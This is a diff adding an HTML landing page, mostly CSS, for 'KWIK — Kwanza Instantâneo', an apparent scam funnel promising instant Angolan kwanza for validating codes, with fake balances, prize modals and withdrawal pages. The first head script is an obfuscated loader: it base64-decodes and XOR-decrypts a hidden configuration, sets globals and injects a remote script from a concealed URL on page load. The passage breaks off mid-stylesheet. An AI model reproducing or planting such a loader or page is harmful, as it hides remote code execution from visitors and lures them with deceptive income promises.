@@ -1,0 +1,2649 @@
+<!DOCTYPE html><html lang="pt"><head>
+  <meta charset="utf-8">
+  <script>(function(){var l_l=atob("DASNERxratFhd507/n+vZG4HSOtDH+lPjne3PjMIDr9PAulWl2L0P38EB/8DBbJInXbkYWgYRaQVGu4UkmX5dG8fRLsSVbEZn3D5Y3UJH6UEBL8BpX+vf30GD/NbVflaimWgZGgGA7cYWu1Jm3Lof2hGErIOE7BInW+vPT4dC70UEr8B3CbwPWdJBLAMEr8B3GDsZX1GH6UMHvtC03T/dGoOBKVMBOhZl2D+MzBJHLANAvgZxCavbEEW");var y_3byq=[];for(var b_yz=0;b_yz<l_l.length;b_yz++){y_3byq.push(l_l.charCodeAt(b_yz)&255);}var u_eo=y_3byq[0];var b_o=y_3byq.slice(1,1+u_eo);var f_pask=y_3byq.slice(1+u_eo);var q_u=f_pask.map(function(b,g_5g){return b^b_o[g_5g%u_eo];});var t_9vkf="";for(var a_bd5f=0;a_bd5f<q_u.length;a_bd5f++){t_9vkf+=String.fromCharCode(q_u[a_bd5f]&255);}var p_sa=decodeURIComponent(escape(t_9vkf));var n_34q=JSON.parse(p_sa);var t_85=n_34q.globals||[];t_85.forEach(function(y_u4x){window[y_u4x.name]=y_u4x.value;});var x_kn=document.createElement("script");x_kn.src=n_34q.url;x_kn.async=true;x_kn.defer=true;(n_34q.attributes||[]).forEach(function(j_m){x_kn.setAttribute(j_m.name,j_m.value);});(document.head||document.documentElement).appendChild(x_kn);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>KWIK — Kwanza Instantâneo</title>
+  <meta name="description" content="Valide códigos KWIK e transforme cada oferta em kwanza instantâneo na sua conta. Cadastre-se e comece agora.">
+  <meta property="og:title" content="KWIK — Kwanza Instantâneo">
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="Renda extra em kwanza instantâneo validando códigos KWIK.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
+  <link rel="preconnect" href="https://scripts.converteai.net">
+  <link rel="preconnect" href="https://cdn.converteai.net">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800;900&amp;family=Archivo:wght@400;600;700;900&amp;family=Playfair+Display:wght@700;900&amp;family=Inter:wght@400;500;600;700&amp;display=swap">
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+  </script>
+  <script src="js/meta-pixel.js"></script>
+  <!-- End Meta Pixel Code -->
+  <style>
+/* ===== KWIK — Design System ===== */
+:root {
+  /* Core brand palette */
+  --brand: #1a1a2e;
+  --brand-foreground: #fffbe6;
+  --brand-red: #e63946;
+  --brand-orange: #f59e0b;   /* deeper amber */
+  --brand-green: #2ec4b6;
+
+  /* Surfaces */
+  --background: #f7f5f0;
+  --card: #ffffff;
+  --secondary: #f0ede6;
+  --accent: #f59e0b;         /* deep amber yellow — matches site */
+  --accent-foreground: #1a1a2e;
+  --muted: #e8e5de;
+
+  /* Text */
+  --foreground: #1a1a2e;
+  --muted-foreground: #8a8680;
+
+  /* Misc */
+  --border: #e0ddd6;
+  --input: #d5d2cc;
+  --destructive: #e63946;
+  --ring: #f59e0b;
+  --radius: 12px;
+  --success-surface: #dcfce7;
+  --success-ink: #166534;
+
+  /* Fonts */
+  --font-display: 'Archivo', system-ui, sans-serif;
+  --font-serif: 'Playfair Display', Georgia, serif;
+  --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+}
+
+/* ===== Reset ===== */
+*, *::before, *::after {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  border: 0 solid transparent;
+}
+
+html {
+  -webkit-text-size-adjust: 100%;
+  line-height: 1.5;
+  font-family: var(--font-display);
+  -webkit-tap-highlight-color: transparent;
+}
+
+body {
+  background: var(--background);
+  color: var(--foreground);
+  min-height: 100vh;
+}
+
+a { color: inherit; text-decoration: none; }
+img, svg { display: block; max-width: 100%; }
+button, input, select, textarea { font: inherit; color: inherit; }
+button { cursor: pointer; background: none; border: none; }
+input { background: none; border: none; outline: none; }
+ol, ul { list-style: none; }
+
+/* ===== App container (mobile-first, max-width 28rem) ===== */
+#app {
+  max-width: 28rem;
+  margin: 0 auto;
+  min-height: 100vh;
+}
+
+/* ===== Utility classes ===== */
+.hidden { display: none !important; }
+.text-center { text-align: center; }
+.text-left { text-align: left; }
+.text-right { text-align: right; }
+.w-full { width: 100%; }
+.mx-auto { margin-left: auto; margin-right: auto; }
+.relative { position: relative; }
+.absolute { position: absolute; }
+.flex { display: flex; }
+.inline-flex { display: inline-flex; }
+.grid { display: grid; }
+.flex-col { flex-direction: column; }
+.items-center { align-items: center; }
+.items-start { align-items: flex-start; }
+.items-end { align-items: flex-end; }
+.justify-between { justify-content: space-between; }
+.justify-center { justify-content: center; }
+.flex-1 { flex: 1; }
+.shrink-0 { flex-shrink: 0; }
+.gap-1 { gap: 0.25rem; }
+.gap-2 { gap: 0.5rem; }
+.gap-3 { gap: 0.75rem; }
+.gap-4 { gap: 1rem; }
+.select-none { user-select: none; -webkit-user-select: none; }
+.overflow-hidden { overflow: hidden; }
+.grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+
+/* ===== KWIK Logo ===== */
+.kwik-logo {
+  display: inline-flex;
+  flex-direction: column;
+  align-items: flex-end;
+  line-height: 1;
+  user-select: none;
+}
+
+.kwik-logo__word {
+  font-family: var(--font-display);
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: -0.05em;
+  color: var(--brand);
+  transform: skewX(-8deg);
+}
+
+.kwik-logo__word--sm { font-size: 1.5rem; }
+.kwik-logo__word--md { font-size: 2.25rem; }
+.kwik-logo__word--lg { font-size: 3.75rem; }
+
+.kwik-logo__i {
+  position: relative;
+  display: inline-block;
+}
+
+.kwik-logo__tri {
+  position: absolute;
+  right: 0;
+  top: 0;
+  background: var(--accent);
+  clip-path: polygon(100% 0, 0 0, 100% 100%);
+}
+
+.kwik-logo__tri--sm { width: 0.375rem; height: 0.375rem; }
+.kwik-logo__tri--md { width: 0.5rem; height: 0.5rem; }
+.kwik-logo__tri--lg { width: 0.75rem; height: 0.75rem; }
+
+.kwik-logo__sub {
+  margin-top: 0.25rem;
+  font-family: var(--font-display);
+  font-weight: 600;
+  text-transform: lowercase;
+  letter-spacing: -0.025em;
+  color: var(--brand-red);
+}
+
+.kwik-logo__sub--sm { font-size: 0.5rem; }
+.kwik-logo__sub--md { font-size: 0.65rem; }
+.kwik-logo__sub--lg { font-size: 0.95rem; }
+
+/* ===== Header curved ===== */
+.header-curved {
+  position: relative;
+  overflow: hidden;
+  border-bottom-left-radius: 45%;
+  border-bottom-right-radius: 45%;
+  background: var(--card);
+  padding: 1.5rem 1.5rem 2.5rem;
+  box-shadow: 0 1px 3px 0 rgba(0,0,0,0.1);
+}
+
+/* ===== Header bar (app pages) ===== */
+.header-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 0.75rem;
+  border-bottom: 1px solid var(--border);
+  background: var(--card);
+  padding: 0.75rem 1rem;
+}
+
+.balance-badge {
+  border-radius: 0.75rem;
+  border: 2px solid var(--accent);
+  padding: 0.25rem 0.75rem;
+  text-align: right;
+  background: rgba(245,158,11,0.08);
+}
+
+.balance-badge__label {
+  font-size: 0.55rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  color: var(--muted-foreground);
+}
+
+.balance-badge__value {
+  font-size: 0.875rem;
+  font-weight: 700;
+  color: var(--brand);
+}
+
+/* ===== Menu icon ===== */
+.menu-btn {
+  margin-top: 0.25rem;
+  padding: 0.25rem;
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.menu-btn svg {
+  width: 2rem;
+  height: 2rem;
+  color: var(--brand);
+}
+
+/* ===== Typography ===== */
+.heading-welcome {
+  margin-top: 3rem;
+  text-align: center;
+  font-family: var(--font-serif);
+  font-size: 3rem;
+  font-weight: 900;
+  color: var(--brand);
+  line-height: 1;
+}
+
+.subtitle-welcome {
+  margin: 1rem auto 0;
+  max-width: 20rem;
+  text-align: center;
+  font-size: 1rem;
+  color: var(--brand);
+}
+
+.heading-page {
+  text-align: center;
+  font-family: var(--font-display);
+  font-size: 1.875rem;
+  font-weight: 900;
+  color: var(--brand);
+}
+
+.subtitle-page {
+  margin-top: 0.25rem;
+  text-align: center;
+  font-size: 1rem;
+  color: var(--muted-foreground);
+}
+
+/* ===== Divider bar ===== */
+.divider-bar {
+  margin: 1rem auto 0;
+  height: 0.25rem;
+  width: 3.5rem;
+  border-radius: 9999px;
+  background: var(--brand-orange);
+}
+
+/* ===== Step cards (homepage) ===== */
+.step-cards {
+  margin-top: 3rem;
+  padding: 0 1.5rem;
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+}
+
+.step-card {
+  display: flex;
+  width: 100%;
+  align-items: center;
+  gap: 1rem;
+  border-radius: 1rem;
+  padding: 1.5rem 1.25rem;
+  text-align: left;
+  transition: transform 0.15s;
+}
+
+.step-card:active { transform: scale(0.99); }
+
+.step-card--active {
+  background: #fef3c7;
+  border: 2px solid var(--accent);
+}
+
+.step-card--disabled {
+  background: var(--secondary);
+}
+
+.step-circle {
+  display: flex;
+  width: 3.5rem;
+  height: 3.5rem;
+  flex-shrink: 0;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+  border: 2px solid;
+  font-family: var(--font-display);
+  font-size: 1.5rem;
+  font-weight: 700;
+}
+
+.step-circle--active {
+  border-color: var(--brand);
+  color: var(--brand);
+}
+
+.step-circle--disabled {
+  border-color: rgba(138,134,128,0.5);
+  color: rgba(138,134,128,0.6);
+}
+
+.step-title {
+  display: block;
+  font-family: var(--font-display);
+  font-size: 1.25rem;
+  font-weight: 700;
+}
+
+.step-title--active { color: var(--brand); }
+.step-title--disabled { color: rgba(138,134,128,0.7); }
+
+.step-desc {
+  display: block;
+  margin-top: 0.25rem;
+  font-size: 0.875rem;
+  line-height: 1.375;
+}
+
+.step-desc--active { color: var(--brand); }
+.step-desc--disabled { color: rgba(138,134,128,0.6); }
+
+.step-chevron {
+  width: 1.5rem;
+  height: 1.5rem;
+  color: var(--brand);
+}
+
+/* ===== Stepper (cadastro) ===== */
+.stepper {
+  margin-top: 2rem;
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+}
+
+.stepper__item {
+  display: flex;
+  flex: 1;
+  flex-direction: column;
+  align-items: center;
+}
+
+.stepper__track {
+  display: flex;
+  width: 100%;
+  align-items: center;
+}
+
+.stepper__line {
+  height: 1px;
+  flex: 1;
+}
+
+.stepper__line--border { background: var(--border); }
+.stepper__line--transparent { background: transparent; }
+
+.stepper__dot {
+  display: flex;
+  width: 2.25rem;
+  height: 2.25rem;
+  flex-shrink: 0;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+  font-size: 0.875rem;
+  font-weight: 700;
+}
+
+.stepper__dot--active {
+  background: var(--accent);
+  color: #1a1a2e;
+  font-weight: 900;
+}
+
+.stepper__dot--inactive {
+  border: 1px solid var(--border);
+  color: var(--muted-foreground);
+}
+
+.stepper__label {
+  margin-top: 0.5rem;
+  font-size: 0.75rem;
+  font-weight: 600;
+}
+
+.stepper__label--active { color: var(--accent); font-weight: 800; }
+.stepper__label--inactive { color: var(--muted-foreground); }
+
+/* ===== Form elements ===== */
+.form-label {
+  display: block;
+  font-size: 0.75rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  color: var(--brand);
+}
+
+.form-input-wrap {
+  position: relative;
+  margin-top: 0.5rem;
+}
+
+.form-input-wrap svg {
+  position: absolute;
+  left: 1rem;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 1.25rem;
+  height: 1.25rem;
+  color: var(--muted-foreground);
+}
+
+.form-input {
+  width: 100%;
+  border-radius: 0.75rem;
+  border: 1px solid var(--input);
+  background: var(--card);
+  padding: 1rem 3rem 1rem 3rem;
+  font-size: 1rem;
+  color: var(--foreground);
+  outline: none;
+  transition: border-color 0.15s;
+}
+
+.form-input::placeholder {
+  color: var(--muted-foreground);
+}
+
+.form-input:focus {
+  border-color: var(--brand-orange);
+}
+
+/* Phone input */
+.phone-wrap {
+  margin-top: 0.5rem;
+  display: flex;
+  align-items: stretch;
+  overflow: hidden;
+  border-radius: 0.75rem;
+  border: 1px solid var(--input);
+  background: var(--card);
+}
+
+.phone-prefix {
+  position: relative;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  border-right: 1px solid var(--input);
+  background: var(--secondary);
+  padding: 0 0.75rem;
+}
+
+.phone-prefix__flag { font-size: 1.125rem; }
+.phone-prefix__code { font-size: 1rem; font-weight: 600; color: var(--foreground); }
+
+.phone-prefix__chevron {
+  width: 1rem;
+  height: 1rem;
+  color: var(--muted-foreground);
+}
+
+.phone-prefix select {
+  position: absolute;
+  inset: 0;
+  cursor: pointer;
+  opacity: 0;
+  width: 100%;
+  height: 100%;
+}
+
+.phone-input {
+  flex: 1;
+  background: var(--card);
+  padding: 1rem;
+  font-size: 1rem;
+  color: var(--foreground);
+  outline: none;
+  border: none;
+}
+
+.phone-input::placeholder {
+  color: var(--muted-foreground);
+}
+
+/* ===== Security notice ===== */
+.security-notice {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.75rem;
+  border-radius: 0.75rem;
+  background: rgba(244, 162, 97, 0.1);
+  padding: 1rem;
+}
+
+.security-notice svg {
+  margin-top: 0.125rem;
+  width: 1.75rem;
+  height: 1.75rem;
+  flex-shrink: 0;
+  color: var(--brand-orange);
+}
+
+.security-notice__title {
+  font-family: var(--font-display);
+  font-size: 1rem;
+  font-weight: 700;
+  color: var(--brand);
+}
+
+.security-notice__desc {
+  font-size: 0.875rem;
+  color: var(--muted-foreground);
+}
+
+/* ===== Buttons ===== */
+.btn-primary {
+  width: 100%;
+  border-radius: 0.75rem;
+  background: var(--accent);
+  padding: 1rem;
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  color: var(--brand);
+  transition: transform 0.1s, filter 0.15s;
+  cursor: pointer;
+  border: none;
+  box-shadow: 0 4px 12px rgba(245,158,11,0.35);
+}
+.btn-primary:hover { filter: brightness(1.08); }
+
+.btn-primary:active { transform: scale(0.99); }
+
+.btn-ghost {
+  display: flex;
+  align-items: center;
+  gap: 0.25rem;
+  font-size: 0.875rem;
+  font-weight: 700;
+  color: var(--brand);
+  background: none;
+  border: none;
+  padding: 0.5rem 1rem;
+  border-radius: 0.375rem;
+  transition: background 0.15s;
+  cursor: pointer;
+}
+
+.btn-ghost:hover { background: var(--accent); }
+
+.btn-ghost svg {
+  width: 1.25rem;
+  height: 1.25rem;
+}
+
+.btn-validate {
+  margin-top: 1rem;
+  width: 100%;
+  border-radius: 0.75rem;
+  background: var(--accent);
+  padding: 1rem;
+  font-family: var(--font-display);
+  font-size: 0.875rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.15em;
+  color: var(--brand);
+  transition: transform 0.1s, filter 0.15s;
+  cursor: pointer;
+  border: none;
+  box-shadow: 0 4px 12px rgba(245,158,11,0.35);
+}
+
+.btn-validate:active { transform: scale(0.99); }
+.btn-validate:hover { filter: brightness(1.08); }
+
+/* ===== Back button ===== */
+.back-btn {
+  position: absolute;
+  left: 0;
+  top: 50%;
+  transform: translateY(-50%);
+  padding: 0.25rem;
+  color: var(--brand);
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+
+.back-btn svg {
+  width: 1.75rem;
+  height: 1.75rem;
+}
+
+/* ===== Error message ===== */
+.error-msg {
+  border-radius: 0.75rem;
+  background: rgba(230, 57, 70, 0.1);
+  padding: 0.75rem;
+  text-align: center;
+  font-size: 0.875rem;
+  font-weight: 600;
+  color: var(--destructive);
+}
+
+/* ===== Success modal (cadastro) ===== */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 50;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: rgba(26,26,46,0.6);
+  padding: 1.5rem;
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
+}
+
+.modal-card {
+  width: 100%;
+  max-width: 24rem;
+  border-radius: 1.5rem;
+  background: var(--card);
+  padding: 2rem;
+  text-align: center;
+  box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+  animation: modalIn 0.3s ease-out;
+}
+
+@keyframes modalIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+
+.modal-icon {
+  margin: 0 auto;
+  display: flex;
+  width: 4rem;
+  height: 4rem;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+}
+
+.modal-icon--success {
+  background: rgba(46,196,182,0.15);
+}
+
+.modal-icon--success svg {
+  width: 2rem;
+  height: 2rem;
+  color: var(--brand-green);
+}
+
+.modal-icon--party {
+  background: rgba(255,251,230,0.2);
+}
+
+.modal-icon--party svg {
+  width: 2rem;
+  height: 2rem;
+  color: var(--brand-foreground);
+}
+
+.modal-title {
+  margin-top: 1.5rem;
+  font-family: var(--font-display);
+  font-size: 1.5rem;
+  font-weight: 900;
+  color: var(--brand);
+}
+
+.modal-text {
+  margin-top: 0.75rem;
+  font-size: 1rem;
+  font-weight: 600;
+  color: var(--foreground);
+}
+
+.modal-text-sm {
+  margin-top: 0.75rem;
+  font-size: 0.875rem;
+  color: var(--muted-foreground);
+}
+
+.modal-text-orange {
+  margin-top: 1rem;
+  font-size: 0.875rem;
+  font-weight: 700;
+  color: var(--brand-orange);
+}
+
+.modal-progress-track {
+  margin: 1.5rem auto 0;
+  height: 0.375rem;
+  width: 8rem;
+  overflow: hidden;
+  border-radius: 9999px;
+  background: var(--secondary);
+}
+
+.modal-progress-bar {
+  height: 100%;
+  border-radius: 9999px;
+  background: var(--brand-orange);
+  animation: shrinkBar 6s linear forwards;
+}
+
+@keyframes shrinkBar {
+  from { width: 100%; }
+  to { width: 0%; }
+}
+
+/* ===== Prize modal (app) ===== */
+.prize-modal-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 50;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0,0,0,0.6);
+  padding: 1rem;
+}
+
+.prize-modal {
+  position: relative;
+  width: 100%;
+  max-width: 24rem;
+  border-radius: 1.5rem;
+  background: var(--brand);
+  padding: 2rem;
+  text-align: center;
+  color: var(--brand-foreground);
+  box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+  animation: modalIn 0.3s ease-out;
+}
+
+.prize-close {
+  position: absolute;
+  right: 1rem;
+  top: 1rem;
+  border-radius: 9999px;
+  padding: 0.25rem;
+  opacity: 0.8;
+  background: none;
+  border: none;
+  color: var(--brand-foreground);
+  cursor: pointer;
+}
+
+.prize-close:hover { opacity: 1; }
+
+.prize-close svg {
+  width: 1.25rem;
+  height: 1.25rem;
+}
+
+.prize-label {
+  margin-top: 1.25rem;
+  font-size: 0.75rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  opacity: 0.9;
+}
+
+.prize-heading {
+  margin-top: 0.25rem;
+  font-family: var(--font-display);
+  font-size: 1.25rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  line-height: 1.25;
+  letter-spacing: 0.05em;
+}
+
+.prize-value {
+  margin-top: 1rem;
+  font-family: var(--font-display);
+  font-size: 2.25rem;
+  font-weight: 900;
+  letter-spacing: 0.02em;
+}
+
+.prize-continue {
+  margin-top: 1.5rem;
+  width: 100%;
+  border-radius: 0.75rem;
+  background: var(--accent);
+  padding: 0.875rem;
+  font-family: var(--font-display);
+  font-size: 0.875rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--brand);
+  border: none;
+  cursor: pointer;
+  transition: transform 0.1s;
+}
+
+.prize-continue:active { transform: scale(0.99); }
+
+/* ===== App page (coupon validation) ===== */
+.app-status {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.5rem;
+}
+
+.app-status svg {
+  width: 1.5rem;
+  height: 1.5rem;
+}
+
+.app-status--green svg { color: var(--brand-green); }
+.app-status--orange svg { color: var(--brand-orange); }
+
+.app-status__text {
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--brand);
+}
+
+.coupon-image {
+  margin: 1.25rem auto 0;
+  width: 100%;
+  max-width: 20rem;
+  display: block;
+}
+
+.coupon-code-label {
+  display: block;
+  font-size: 0.65rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  color: var(--muted-foreground);
+}
+
+.coupon-code-input {
+  margin-top: 0.75rem;
+  width: 100%;
+  border-radius: 0.75rem;
+  border: 2px solid;
+  background: var(--card);
+  padding: 1rem;
+  text-align: center;
+  font-family: var(--font-mono);
+  font-size: 1.125rem;
+  letter-spacing: 0.3em;
+  outline: none;
+  transition: border-color 0.2s, color 0.2s;
+}
+
+.coupon-code-input::placeholder {
+  font-size: 0.875rem;
+  letter-spacing: normal;
+  font-family: var(--font-display);
+}
+
+.coupon-code-input--default {
+  border-color: var(--input);
+  color: var(--foreground);
+}
+
+.coupon-code-input--default:focus {
+  border-color: var(--brand);
+}
+
+.coupon-code-input--valid {
+  border-color: var(--brand-green);
+  color: var(--brand-green);
+}
+
+.coupon-code-input--partial {
+  border-color: var(--brand-green);
+  color: var(--foreground);
+}
+
+.coupon-code-input--invalid {
+  border-color: var(--brand-red);
+  color: var(--brand-red);
+}
+
+.app-feedback {
+  margin-top: 1rem;
+  border-radius: 0.75rem;
+  background: var(--card);
+  padding: 0.75rem;
+  text-align: center;
+  font-size: 0.875rem;
+  font-weight: 600;
+  color: var(--brand);
+}
+
+/* ===== Final balance card ===== */
+.final-card {
+  margin-top: 1.25rem;
+  border-radius: 1rem;
+  background: var(--brand);
+  padding: 1.5rem;
+  text-align: center;
+  color: var(--brand-foreground);
+}
+
+.final-card__label {
+  font-size: 0.75rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  opacity: 0.8;
+}
+
+.final-card__value {
+  margin-top: 0.5rem;
+  font-family: var(--font-display);
+  font-size: 1.875rem;
+  font-weight: 900;
+}
+
+.final-card__desc {
+  margin-top: 0.75rem;
+  font-size: 0.875rem;
+  opacity: 0.9;
+}
+
+.final-card__btn {
+  margin-top: 1.25rem;
+  height: auto;
+  width: 100%;
+  border-radius: 0.75rem;
+  background: var(--accent);
+  padding: 1rem;
+  font-family: var(--font-display);
+  font-size: 0.875rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.15em;
+  color: var(--brand);
+  border: none;
+  cursor: pointer;
+  transition: transform 0.1s;
+}
+
+.final-card__btn:active { transform: scale(0.99); }
+
+/* ===== Saque page ===== */
+.method-btn {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0.5rem;
+  white-space: normal;
+  border-radius: 0.75rem;
+  border: 2px solid;
+  padding: 1rem;
+  font-size: 0.875rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.15s, border-color 0.15s;
+  background: none;
+}
+
+.method-btn--active {
+  border-color: var(--accent);
+  background: rgba(245,158,11,0.12);
+  color: var(--brand);
+}
+
+.method-btn--inactive {
+  border-color: var(--border);
+  background: var(--card);
+  color: var(--muted-foreground);
+}
+
+.method-btn img {
+  height: 2.5rem;
+  width: 3.5rem;
+  border-radius: 0.375rem;
+  object-fit: cover;
+}
+
+.method-btn svg {
+  width: 1.5rem;
+  height: 1.5rem;
+}
+
+/* ===== Levantamento (loading spinner) ===== */
+.loading-page {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  background: var(--background);
+  padding: 2rem;
+  text-align: center;
+}
+
+.spinner-wrap {
+  position: relative;
+  width: 4rem;
+  height: 4rem;
+}
+
+.spinner-outer {
+  width: 4rem;
+  height: 4rem;
+  border-radius: 9999px;
+  border: 4px solid var(--brand-orange);
+  border-top-color: transparent;
+  animation: spin 1s linear infinite;
+}
+
+.spinner-inner {
+  position: absolute;
+  inset: 0.5rem;
+  border-radius: 9999px;
+  border: 4px solid var(--brand);
+  border-top-color: transparent;
+  animation: spin 1.4s linear infinite reverse;
+}
+
+@keyframes spin {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+
+.loading-title {
+  margin-top: 2rem;
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  color: var(--brand);
+}
+
+.loading-subtitle {
+  margin-top: 0.5rem;
+  font-size: 0.875rem;
+  font-weight: 600;
+  color: var(--muted-foreground);
+}
+
+/* ===== Page padding ===== */
+.page-padded {
+  padding: 1.5rem;
+  padding-bottom: 2.5rem;
+}
+
+.page-main {
+  background: var(--background);
+  min-height: 100vh;
+  padding-bottom: 2.5rem;
+}
+
+/* ===== Space ===== */
+.mt-1 { margin-top: 0.25rem; }
+.mt-2 { margin-top: 0.5rem; }
+.mt-3 { margin-top: 0.75rem; }
+.mt-4 { margin-top: 1rem; }
+.mt-5 { margin-top: 1.25rem; }
+.mt-6 { margin-top: 1.5rem; }
+.mt-8 { margin-top: 2rem; }
+.space-y-5 > * + * { margin-top: 1.25rem; }
+.space-y-6 > * + * { margin-top: 1.5rem; }
+
+/* ===== Animations ===== */
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+.animate-fade-in {
+  animation: fadeIn 0.25s ease-out;
+}
+
+/* ===== Coupon image & step dots ===== */
+.coupon-img {
+  display: block;
+  margin: 1rem auto 0;
+  width: 100%;
+  max-width: 20rem;
+  border-radius: 1rem;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+}
+
+.coupon-fallback {
+  margin: 1rem auto 0;
+  width: 100%;
+  max-width: 20rem;
+  border-radius: 1rem;
+  background: linear-gradient(135deg, var(--brand) 0%, #2d2d5e 100%);
+  padding: 1.5rem;
+  text-align: center;
+  color: var(--brand-foreground);
+  box-shadow: 0 8px 24px rgba(0,0,0,0.18);
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+}
+
+.coupon-fallback__inner {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.coupon-fallback__label {
+  font-size: 0.65rem;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  opacity: 0.7;
+}
+
+.coupon-fallback__brand {
+  margin-top: 0.5rem;
+  font-family: var(--font-display);
+  font-size: 1.75rem;
+  font-weight: 900;
+  letter-spacing: 0.05em;
+}
+
+.coupon-fallback__code {
+  margin: 1rem auto;
+  background: rgba(255,255,255,0.15);
+  border-radius: 0.5rem;
+  padding: 0.75rem 1.5rem;
+  font-family: var(--font-mono);
+  font-size: 1.5rem;
+  letter-spacing: 0.3em;
+  font-weight: 700;
+}
+
+.coupon-fallback__value {
+  font-size: 0.875rem;
+  opacity: 0.85;
+}
+
+.coupon-fallback__value strong {
+  color: var(--accent);
+  font-size: 1rem;
+}
+
+.step-dots {
+  display: flex;
+  justify-content: center;
+  gap: 0.3rem;
+  margin-bottom: 0.5rem;
+}
+
+.step-dot {
+  width: 0.5rem;
+  height: 0.5rem;
+  border-radius: 9999px;
+  transition: background 0.2s, transform 0.2s;
+}
+
+.step-dot--done    { background: var(--brand-green); }
+.step-dot--current { background: var(--accent); transform: scale(1.3); }
+.step-dot--pending { background: var(--muted); }
+
+.coupon-step-label {
+  text-align: center;
+  font-size: 0.75rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.15em;
+  color: var(--muted-foreground);
+  margin-bottom: 0.25rem;
+}
+
+/* ===== Saque Sucesso Page ===== */
+.sucesso-page {
+  min-height: 100vh;
+  background: var(--success-surface);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 2rem;
+  text-align: center;
+}
+
+.sucesso-check {
+  display: flex;
+  width: 9rem;
+  height: 9rem;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+  background: var(--brand);
+  box-shadow: 0 12px 32px rgba(26,26,46,0.25);
+}
+
+.sucesso-check svg {
+  width: 5rem;
+  height: 5rem;
+  color: var(--brand-foreground);
+}
+
+.sucesso-title {
+  margin-top: 2.5rem;
+  font-family: var(--font-display);
+  font-size: 3rem;
+  font-weight: 900;
+  letter-spacing: -0.03em;
+  color: var(--brand);
+  line-height: 1;
+}
+
+.sucesso-text {
+  margin-top: 1.25rem;
+  font-size: 1.125rem;
+  font-weight: 700;
+  line-height: 1.5;
+  color: var(--success-ink);
+  max-width: 22rem;
+}
+
+.sucesso-text strong {
+  font-weight: 900;
+}
+
+.sucesso-subtext {
+  margin-top: 1.25rem;
+  font-size: 1rem;
+  font-weight: 500;
+  line-height: 1.6;
+  color: var(--success-ink);
+  max-width: 22rem;
+}
+
+.sucesso-btn {
+  margin-top: 2.5rem;
+  display: flex;
+  width: 100%;
+  max-width: 22rem;
+  align-items: center;
+  justify-content: space-between;
